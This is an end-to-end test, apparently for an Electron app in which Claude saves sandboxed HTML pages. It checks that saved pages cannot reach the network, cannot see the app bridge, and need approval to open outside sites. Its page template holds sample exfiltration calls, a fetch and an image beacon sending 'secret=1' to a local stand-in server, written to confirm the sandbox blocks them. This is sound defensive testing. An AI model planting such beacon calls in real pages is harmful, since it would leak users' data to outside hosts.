import http from 'node:http'
import fs from 'node:fs'
import path from 'node:path'
import os from 'node:os'
import electronPath from 'electron'
import { _electron } from 'playwright-core'

// End-to-end test for pages (src/main/pages.ts): Claude saves an HTML page in a project
// (save_page), it opens in one of the project's tabs and is listed on the project's Home, and it
// runs apart from the web: no network, its own storage, links out in a new tab. A local site
// plays the web and a mock Claude API scripts the tool calls. No network or API keys. Run
// `npm run build` first. On Linux CI, wrap with `xvfb-run -a`.
const REPO = path.resolve(path.dirname(new URL(import.meta.url).pathname), '..')
const OUT = fs.mkdtempSync(path.join(os.tmpdir(), 'mcpc-pages-out-'))

// MARK: - The web

const hits = []
const site = http.createServer((req, res) => {
  hits.push(req.url)
  res.writeHead(200, { 'content-type': 'text/html', 'access-control-allow-origin': '*' })
  res.end('<title>Outside</title><h1>The web</h1>')
})
await new Promise((r) => site.listen(0, '127.0.0.1', r))
const SITE = `http://127.0.0.1:${site.address().port}`

// MARK: - Mock Claude API

const requests = []
let script = []
const api = http.createServer((req, res) => {
  let body = ''
  req.on('data', (d) => (body += d))
  req.on('end', () => {
    const request = JSON.parse(body)
    if (!request.stream) {
      res.writeHead(200, { 'content-type': 'application/json' })
      return res.end(JSON.stringify({
        id: 'msg_t', type: 'message', role: 'assistant', model: request.model, stop_reason: 'end_turn', stop_sequence: null,
        content: [{ type: 'text', text: request.output_config?.format ? '{"suggestions":[]}' : 'Pages' }],
        usage: { input_tokens: 1, output_tokens: 1 }
      }))
    }
    requests.push(request)
    const blocks = script.shift()?.(request) ?? [{ type: 'text', text: 'END' }]
    /** Events written with a pause before them: a tool's input streamed slowly, as a long page is. */
    const pauses = new Map()
    const events = [
      { type: 'message_start', message: { id: 'm', type: 'message', role: 'assistant', model: 'claude-opus-5', content: [], stop_reason: null, stop_sequence: null, usage: { input_tokens: 1, output_tokens: 0 } } }
    ]
    blocks.forEach((b, index) => {
      if (b.type === 'text') {
        events.push(
          { type: 'content_block_start', index, content_block: { type: 'text', text: '' } },
          { type: 'content_block_delta', index, delta: { type: 'text_delta', text: b.text } }
        )
      } else {
        events.push({ type: 'content_block_start', index, content_block: { type: 'tool_use', id: b.id, name: b.name, input: {} } })
        const json = JSON.stringify(b.input)
        const parts = b.slowMs ? 8 : 1
        const size = Math.ceil(json.length / parts)
        for (let i = 0; i < json.length; i += size) {
          const e = { type: 'content_block_delta', index, delta: { type: 'input_json_delta', partial_json: json.slice(i, i + size) } }
          if (b.slowMs) pauses.set(e, b.slowMs / parts)
          events.push(e)
        }
      }
      events.push({ type: 'content_block_stop', index })
    })
    const stop = blocks.some((b) => b.type === 'tool_use') ? 'tool_use' : 'end_turn'
    events.push(
      { type: 'message_delta', delta: { stop_reason: stop, stop_sequence: null }, usage: { output_tokens: 5 } },
      { type: 'message_stop' }
    )
    res.writeHead(200, { 'content-type': 'text/event-stream' })
    void (async () => {
      for (const e of events) {
        if (pauses.has(e)) await new Promise((r) => setTimeout(r, pauses.get(e)))
        res.write(`event: ${e.type}\ndata: ${JSON.stringify(e)}\n\n`)
      }
      res.end()
    })()
  })
})
await new Promise((r) => api.listen(0, '127.0.0.1', r))

const call = (tool, input, extra = {}) => (request) => {
  if (!(request.tools ?? []).some((t) => t.name === tool)) {
    throw new Error(`${tool} wasn't offered; tools: ${(request.tools ?? []).map((t) => t.name)}`)
  }
  return [{ type: 'tool_use', id: `toolu_${tool}_${requests.length}`, name: tool, input, ...extra }]
}
const toolResults = (request) => request.messages.at(-1).content.filter((b) => b.type === 'tool_result')
const resultText = (block) => (typeof block.content === 'string' ? block.content : block.content.map((c) => c.text).join(''))

// MARK: - App

const userDataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mcpc-pages-'))
fs.writeFileSync(path.join(userDataDir, 'mcp.json'), JSON.stringify({ mcpServers: {} }))
const logs = []
const app = await _electron.launch({
  executablePath: electronPath,
  args: [...(process.getuid?.() === 0 ? ['--no-sandbox'] : []), `${REPO}/out/main/index.js`, `--user-data-dir=${userDataDir}`],
  env: {
    ...process.env,
    ANTHROPIC_API_KEY: 'test-key',
    TIDEPOOL_E2E: '1',
    ANTHROPIC_BASE_URL: `http://127.0.0.1:${api.address().port}`
  }
})
app.process().stderr.on('data', (d) => logs.push(String(d)))
const win = await app.firstWindow()
const overlayPage = async (name, timeout = 10000) => {
  for (const end = Date.now() + timeout; Date.now() < end; await new Promise((r) => setTimeout(r, 50))) {
    for (const page of app.windows()) if (page.url() === 'about:blank' && (await page.title()) === name) return page
  }
  throw new Error(`the ${name} overlay never opened`)
}
const chatWin = await overlayPage('chat')
const dockWin = await overlayPage('dock')

let failed = false
const step = async (name, fn) => {
  try {
    await fn()
    console.log('PASS', name)
  } catch (e) {
    failed = true
    console.log('FAIL', name, '-', e.message.replace(/\n/g, ' ⏎ ').slice(0, 1500))
    await win.screenshot({ path: `${OUT}/fail-${name.replace(/\W+/g, '_')}.png` }).catch(() => {})
  }
}
const assert = (cond, message) => {
  if (!cond) throw new Error(message)
}
const until = async (fn, label, ms = 10000) => {
  for (const start = Date.now(); Date.now() - start < ms; await win.waitForTimeout(100)) if (await fn()) return
  throw new Error(`timed out: ${label}`)
}
const turnsEnded = () => chatWin.locator('.msg.assistant', { hasText: 'END' }).count()
const chat = async (text, steps = []) => {
  const before = await turnsEnded()
  script = steps
  if (!(await win.locator('.layout.chat-open').count())) await dockWin.getByRole('button', { name: 'Show chat' }).click()
  await chatWin.getByPlaceholder('Message Tidepool…').fill(text)
  await chatWin.keyboard.press('Enter')
  await until(async () => (await turnsEnded()) > before, `turn for "${text}" to end`, 30000)
}
const project = async (id) => (await win.evaluate(() => window.api.projects.list())).find((p) => p.id === id)
/** Runs `code` in the page at `url`, in its own world, as it is now. */
const inPage = (url, code) =>
  app.evaluate(
    async ({ webContents }, [url, code]) => {
      const wc = webContents.getAllWebContents().find((w) => w.getURL() === url)
      return wc ? wc.executeJavaScript(code) : '(no such page)'
    },
    [url, code]
  )

const PAGE = (title, extra = '') => `<!doctype html>
<html><head><title>${title}</title><style>body{font:16px system-ui;padding:24px}</style></head>
<body><h1>${title}</h1><p id="out">running…</p>
<a id="out-link" href="${SITE}/linked">A website</a>
<script>
  localStorage.setItem('visits', String(Number(localStorage.getItem('visits') || 0) + 1))
  const out = document.getElementById('out')
  out.textContent = 'script ran'
  fetch('${SITE}/exfil?secret=1').then(() => (out.dataset.fetch = 'reached'), () => (out.dataset.fetch = 'blocked'))
  const img = new Image(); img.onerror = () => (out.dataset.img = 'blocked'); img.onload = () => (out.dataset.img = 'loaded'); img.src = '${SITE}/pixel?secret=1'
  out.dataset.preload = typeof window.api
  ${extra}
</script></body></html>`

try {
  await dockWin.locator('.dock').waitFor()
  const projectId = await win.evaluate(() => window.api.projects.create('Trip'))
  const url = `tidepool-page://${projectId}/trip-plan`

  await step('save_page is offered, saves the page and opens it in a tab of the project', async () => {
    await chat('make me a trip plan', [call('save_page', { name: 'Trip Plan', html: PAGE('Lisbon trip'), project_id: projectId })])
    const text = resultText(toolResults(requests.at(-1))[0])
    assert(text.includes('Saved “Lisbon trip” (trip-plan) in Trip and showed it in tab'), text)
    assert(fs.existsSync(path.join(userDataDir, 'pages', projectId, 'trip-plan.html')), 'no file on disk')
    const p = await project(projectId)
    const active = p.tabs.find((t) => t.id === p.activeTabId)
    assert(active?.url === url, JSON.stringify(p.tabs))
    await until(async () => (await project(projectId)).tabs[0].title === 'Lisbon trip', 'the tab to take the page title')
  })

  await step('the page runs its scripts but reaches nothing on the web, and gets no app bridge', async () => {
    await until(async () => (await inPage(url, "document.getElementById('out').dataset.img || ''")) === 'blocked', 'the image to be refused')
    await until(async () => (await inPage(url, "document.getElementById('out').dataset.fetch || ''")) === 'blocked', 'the fetch to be refused')
    assert((await inPage(url, "document.getElementById('out').textContent")) === 'script ran', 'script did not run')
    assert((await inPage(url, "document.getElementById('out').dataset.preload")) === 'undefined', 'the page can see window.api')
    assert(!hits.some((h) => h.includes('secret')), `the site was reached: ${hits}`)
    await win.screenshot({ path: `${OUT}/page.png` })
  })

  await step('a link out opens the website in a new tab and leaves the page where it is', async () => {
    const before = (await project(projectId)).tabs.length
    await inPage(url, "document.getElementById('out-link').click()")
    await until(async () => (await project(projectId)).tabs.some((t) => t.url === `${SITE}/linked`), 'the link to open in a tab')
    const p = await project(projectId)
    assert(p.tabs.length === before + 1, `${p.tabs.length} tabs`)
    assert(p.tabs.some((t) => t.url === url), 'the page tab went somewhere else')
  })

  await step('saving it again reloads the tab showing it rather than opening another', async () => {
    const before = (await project(projectId)).tabs.length
    await chat('change it', [call('save_page', { name: 'trip-plan', html: PAGE('Lisbon trip, v2'), project_id: projectId })])
    await until(async () => (await inPage(url, 'document.title')) === 'Lisbon trip, v2', 'the page to reload')
    const p = await project(projectId)
    assert(p.tabs.length === before, `${p.tabs.length} tabs`)
    assert(p.tabs.find((t) => t.id === p.activeTabId)?.url === url, 'the page is not the tab on screen')
    // Its storage survived the reload.
    assert(Number(await inPage(url, "localStorage.getItem('visits')")) >= 2, 'localStorage was not kept')
  })

  await step('list_pages and get_page_source let Claude find and change a page', async () => {
    await chat('what pages are there?', [call('list_pages', { project_id: projectId })])
    const list = resultText(toolResults(requests.at(-1))[0])
    assert(list.includes('- trip-plan: “Lisbon trip, v2”') && list.includes(url), list)
    await chat('show me its source', [call('get_page_source', { name: 'trip-plan', project_id: projectId })])
    assert(resultText(toolResults(requests.at(-1))[0]).includes('<title>Lisbon trip, v2</title>'), 'source not returned')
  })

  await step('open_page to a page needs no approval, and a bad page is refused', async () => {
    await chat('not a page', [call('save_page', { name: 'x', html: 'just words' })])
    const [bad] = toolResults(requests.at(-1))
    assert(bad.is_error && resultText(bad).includes('whole HTML document'), resultText(bad))
    // Reading something first would make opening an address ask; a page's own address doesn't.
    await chat('open it', [call('list_tabs', { project_id: projectId }), call('open_page', { url, project_id: projectId })])
    assert(!(await chatWin.locator('.approval').count()), 'asked to open a page')
    const p = await project(projectId)
    assert(p.tabs.filter((t) => t.url === url).length === 1, 'opened the page a second time')
  })

  await step('while Claude writes a page, the chat says so, with how much is written', async () => {
    const big = PAGE('Big one', `/* ${'x'.repeat(40_000)} */`)
    const before = await turnsEnded()
    script = [call('save_page', { name: 'big-one', html: big, project_id: projectId }, { slowMs: 4000 })]
    if (!(await win.locator('.layout.chat-open').count())) await dockWin.getByRole('button', { name: 'Show chat' }).click()
    await chatWin.getByPlaceholder('Message Tidepool…').fill('make a big page')
    await chatWin.keyboard.press('Enter')
    const drafting = chatWin.locator('.tool-header.drafting', { hasText: 'Building the page' })
    await drafting.waitFor({ timeout: 5000 })
    await until(async () => /\d+ KB/.test(await drafting.innerText()), 'the size to show', 5000)
    await chatWin.screenshot({ path: `${OUT}/drafting.png` })
    await until(async () => (await turnsEnded()) > before, 'the turn to end', 30000)
    assert(!(await chatWin.locator('.tool-header.drafting').count()), 'still shown as being written')
    assert(await chatWin.locator('.tool-header.done', { hasText: 'save_page' }).count(), 'the call did not take its place')
  })

  await step('opening a website after reading one asks, unless approvals are skipped', async () => {
    const approval = chatWin.locator('.approval')
    const before = await turnsEnded()
    script = [call('list_tabs', { project_id: projectId }), call('open_page', { url: `${SITE}/asked`, project_id: projectId })]
    await chatWin.getByPlaceholder('Message Tidepool…').fill('go there')
    await chatWin.keyboard.press('Enter')
    await approval.waitFor({ timeout: 10000 })
    await approval.getByRole('button', { name: 'Deny' }).click()
    await until(async () => (await turnsEnded()) > before, 'the turn to end', 30000)
    await win.evaluate(() => window.api.settings.update({ skipApprovals: true }))
    await chat('go there anyway', [call('list_tabs', { project_id: projectId }), call('open_page', { url: `${SITE}/skipped`, project_id: projectId })])
    assert(resultText(toolResults(requests.at(-1))[0]).includes('Opening'), 'not opened')
    assert((await project(projectId)).tabs.some((t) => t.url === `${SITE}/skipped`), 'no tab')
    await win.evaluate(() => window.api.settings.update({ skipApprovals: false }))
  })

  await step("the project's Home lists the page; a click opens it and × deletes it", async () => {
    await win.locator('.sidebar').getByRole('button', { name: /^Trip/ }).first().click()
    await win.locator('.project-strip .project-home-tab').click()
    const card = win.locator('.project-home .home-card', { hasText: 'Pages' })
    const row = card.getByTitle('Open Lisbon trip, v2')
    await row.waitFor({ timeout: 5000 })
    await win.screenshot({ path: `${OUT}/home.png` })
    await row.click()
    await until(async () => {
      const p = await project(projectId)
      return p.tabs.find((t) => t.id === p.activeTabId)?.url === url
    }, 'the page to be the active tab')
    await win.locator('.project-strip .project-home-tab').click()
    win.once('dialog', (d) => d.accept())
    await card.getByRole('button', { name: 'Delete Lisbon trip, v2' }).click({ force: true })
    await row.waitFor({ state: 'detached', timeout: 5000 })
    assert(!(await project(projectId)).tabs.some((t) => t.url === url), 'its tab stayed open')
    assert(!fs.existsSync(path.join(userDataDir, 'pages', projectId, 'trip-plan.html')), 'the file is still there')
  })

  await step('deleting the project deletes its pages', async () => {
    fs.writeFileSync(path.join(userDataDir, 'pages', projectId, 'left.html'), PAGE('Left'))
    await win.evaluate((id) => window.api.projects.remove(id), projectId)
    assert(!fs.existsSync(path.join(userDataDir, 'pages', projectId)), 'the project folder is still there')
  })
} finally {
  if (failed) console.log(logs.join('').slice(-3000))
  console.log('screenshots in', OUT)
  await app.close()
  site.close()
  api.close()
}
process.exit(failed ? 1 : 0)
